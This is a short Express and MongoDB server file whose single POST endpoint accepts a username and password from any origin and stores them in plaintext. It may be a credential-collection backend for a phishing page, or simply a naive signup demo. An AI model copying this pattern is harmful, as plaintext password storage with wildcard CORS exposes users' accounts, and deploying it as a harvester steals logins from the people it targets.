const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
dotenv.config();

const UserModel = require("./models/Accounts");

// configure the connections
const app = express();
app.use(express.json());
app.use(cors({ origin: `*` }));

mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log("Connected to MongoDB"));

app.post("/", (req, res) => {
  const { user, pass } = req.body;

  // send the data to the database
  const userr = new UserModel({ user, pass });
  userr.save();
  res.send("Done");
});

app.listen(process.env.PORT, () => {
  console.log("Server is Running");
});
